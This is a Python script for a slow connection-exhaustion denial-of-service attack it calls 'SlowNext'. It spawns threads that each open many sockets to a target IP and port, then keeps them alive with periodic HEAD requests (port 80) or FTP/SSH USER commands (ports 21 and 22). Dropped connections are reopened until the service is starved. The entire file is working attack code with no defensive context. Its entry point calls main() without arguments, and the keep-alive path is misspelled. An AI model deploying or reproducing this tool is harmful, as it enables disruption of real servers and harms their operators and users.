import argparse
import threading
import socket
import random
import time
import sys
import os
import string

# socket initiation for SlowNext attack ------------------------------------------------------------------------------------------
def init_socket_N(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect((ip, port))
    s.send(payload)
    s.recv(350)
    return s

# Slow Next algorithm
def slowNext(ip, socket_count, port, payload, keep_alive, timeout):
    list_of_sockets = []
    print(f"Thread \"{threading.current_thread().ident}\" running")

    # initializing connections
    for _ in range(socket_count):
        try:
            s = init_socket_N(ip, port, payload)
        except socket.error:
            break
        list_of_sockets.append(s)

    time.sleep(0.5)

    # run loop for creating and maintaining open connections
    while True:
        list_of_sockets_ORIGINAL = list(list_of_sockets)
        for s in list(list_of_sockets_ORIGINAL):
            try:
                s.send(keep_alive)
                s.recv(350)
            except socket.error:
                s.shutdown(2)
                s.close()
                list_of_sockets.remove(s)
                s_new = init_socket_N(ip, port, payload)
                if s_new:
                    list_of_sockets.append(s_new)
        time.sleep(timeout)


# prints Slow Nexts parameters
def printSlowNextStats(ip, port, threadCount, socket_count, payload, keep_alive, timeout, timeout_2):
    print("IP: {}".format(ip))
    print("Port: {}".format(port))
    print("Number of threads used: {}".format(threadCount))
    print("Number of connections per thread: {}".format(socket_count))
    print("Payload: {}".format(payload))
    print("Keep_alive: {}".format(keep_alive))
    print("Timeout: {}".format(timeout))
    print("Timeout_2: {}".format(timeout_2))
    print("\nSlowNext - Attacking {} with {} sockets".format(ip, socket_count * threadCount))


# main ---------------------------------------------------------------------------------------------------------------------------
def main(attack, ip, port,timeout, connection,payload,timeout_2,threadCount ):
    # payload set according to ports, services and attacks
    if payload=="none":
        if port == 80:
            if attack == "N":
                payload = f"HEAD /index.html HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode("utf-8")
                keep_alive = f"HEAD /index.hmtl HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode("utf-8")
            else:
                print("You didn't enter appropriate parameters")
                exit()
        elif port == 21 or port == 22:
            payload = f"USER {''.join(random.choice(string.ascii_lowercase) for i in range(5))}\r\n".encode("utf-8")
            keep_alive = payload
    # thread and timeout set

    if attack == "N":
        # timeout for the break between sending next requests for Slow Next
        if timeout == 0:
            timeout = 3.5
        else:
            timeout = timeout

        if timeout_2 == 0:
            timeout_2 = 0
        else:
            timeout_2 = timeout_2

        # initializing attacks according to entered parameters
        printSlowNextStats(ip, port, threadCount,connection, payload, keep_alive, timeout, timeout_2)
        i = 0
        start = time.perf_counter()
        for _ in range(threadCount):
            t = threading.Thread(target=slowNext, args=[ip, connection, port, payload, keep_alive, timeout])
            t.daemon = True
            t.start()
            i = i + 1
            time.sleep(timeout_2)

        finish = time.perf_counter()
        print(f"\n{i} threads created in {round(finish - start, 2)} second(s)")
        print("Attack in progress...")

        while True:
            time.sleep(3000)


if __name__ == "__main__":
    main()
